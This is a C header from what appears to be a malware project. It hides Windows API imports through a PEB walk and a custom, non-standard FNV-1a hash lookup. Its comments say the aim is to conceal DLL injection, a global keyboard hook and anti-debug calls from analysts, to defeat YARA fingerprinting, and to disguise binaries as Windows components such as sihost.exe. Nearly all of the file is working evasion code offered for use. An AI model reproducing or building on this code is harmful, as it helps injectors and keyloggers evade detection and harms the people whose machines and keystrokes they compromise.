/* ================================================================== *
 * lazy_api.h — Hide selected WinAPI calls from the IAT.               *
 *                                                                    *
 * Problem: dumpbin /IMPORTS dwmapiext.dll (or sihost.exe) lists     *
 * every WinAPI we call. Certain functions are dead giveaways for a   *
 * static analyst:                                                     *
 *   - CreateRemoteThread + WriteProcessMemory + VirtualAllocEx       *
 *     → "this is a DLL injector"                                     *
 *   - SetWindowsHookExW + WH_KEYBOARD_LL                             *
 *     → "this hooks the keyboard globally"                           *
 *   - NtQueryInformationProcess with ProcessDebugPort                *
 *     → "this does anti-debug"                                       *
 *                                                                    *
 * Fix: resolve those APIs at RUNTIME via PEB-walk + export-table     *
 * hash lookup. No plaintext function name string ever hits .rdata.   *
 * The IAT drops from ~150 entries to ~40 innocuous ones.             *
 *                                                                    *
 * Usage:                                                              *
 *   auto pOpenProcess = LAZY_API(kernel32, OpenProcess);              *
 *   HANDLE h = pOpenProcess(...);                                     *
 *                                                                    *
 * Constraints:                                                        *
 *   1. C only (no C++ decltype magic — keeps compat with our .c     *
 *      files). Caller provides the function-pointer type.             *
 *   2. Custom hash algorithm inlined per call so `strings` doesn't    *
 *      find "kernel32.dll" or API name literals.                     *
 *   3. Widechar module names (PEB LDR uses UNICODE_STRING); narrow   *
 *      export names.                                                  *
 * ================================================================== */
#ifndef SVCLDB_LAZY_API_H
#define SVCLDB_LAZY_API_H

#include <windows.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/* Compile-time-friendly runtime hash. FNV-1a variant with a mix constant
 * so it doesn't collide with well-known FNV-1a hashes (which YARA rules
 * do fingerprint). Both compile-time (constexpr-like via inline
 * evaluation at O2) and runtime use this exact function to guarantee
 * hash equality. */
static inline uint32_t svc_hash_a(const char *s) {
    uint32_t h = 0x811C9DC5u ^ 0x53564C43u;   /* FNV offset XOR "SVLC" */
    while (*s) {
        char c = *s++;
        /* Case-insensitive for ASCII to match Windows export names
         * (which vary in case across DLLs). */
        if (c >= 'A' && c <= 'Z') c = (char)(c - 'A' + 'a');
        h ^= (uint8_t)c;
        h *= 0x01000193u;
    }
    return h;
}

/* Widechar variant for module names (PEB LDR entries are UNICODE_STRING).
 * Case-insensitive comparison — Windows treats module names as CI. */
static inline uint32_t svc_hash_w(const wchar_t *s) {
    uint32_t h = 0x811C9DC5u ^ 0x53564C43u;
    while (*s) {
        wchar_t c = *s++;
        if (c >= L'A' && c <= L'Z') c = (wchar_t)(c - L'A' + L'a');
        h ^= (uint8_t)(c & 0xFF);
        h *= 0x01000193u;
    }
    return h;
}

/* Locate a loaded module by wide-name hash via PEB walk. Returns
 * NULL if not currently loaded (caller must LoadLibrary first, but
 * we don't for the DLLs listed in lazy_api.c — they're all guaranteed-
 * loaded ntdll/kernel32/user32/advapi32 dependents. */
void *lazy_get_module_by_hash(uint32_t module_name_hash_w);

/* Resolve `proc_name_hash` inside `module_base`'s Export Address Table.
 * Handles both named exports and forwarded exports (walks the forwarder
 * chain via GetModuleHandleA + inline hash of the forward name). */
void *lazy_get_proc_by_hash(void *module_base, uint32_t proc_name_hash);

/* Convenience: resolve directly from module name hash + proc name hash. */
void *lazy_resolve(uint32_t module_name_hash_w, uint32_t proc_name_hash);

/* ─── LAZY_API macro ──────────────────────────────────────────────────
 *
 * Caller-supplied function-pointer type. Example:
 *
 *   typedef HANDLE (WINAPI *PFN_OpenProcess)(DWORD, BOOL, DWORD);
 *   PFN_OpenProcess pOpen = LAZY_API(PFN_OpenProcess, L"kernel32.dll", "OpenProcess");
 *
 * Both string args are computed to hashes at compile time (constant
 * folding by MSVC/O2 sees `svc_hash_w(L"kernel32.dll")` as a pure
 * function of a compile-time-constant string and folds it to a u32).
 *
 * The hash values DO end up in the binary as immediates but they look
 * like normal constants — analysts have to guess which of the ~200
 * distinct constants are import hashes vs random program constants,
 * then brute-force reverse each hash against a Windows API dictionary.
 * That's hours of work vs the current 30 seconds of dumpbin /IMPORTS. */
#define LAZY_API(PFN, module_wide, proc_ascii) \
    ((PFN)lazy_resolve(svc_hash_w(module_wide), svc_hash_a(proc_ascii)))

#ifdef __cplusplus
}
#endif

#endif /* SVCLDB_LAZY_API_H */
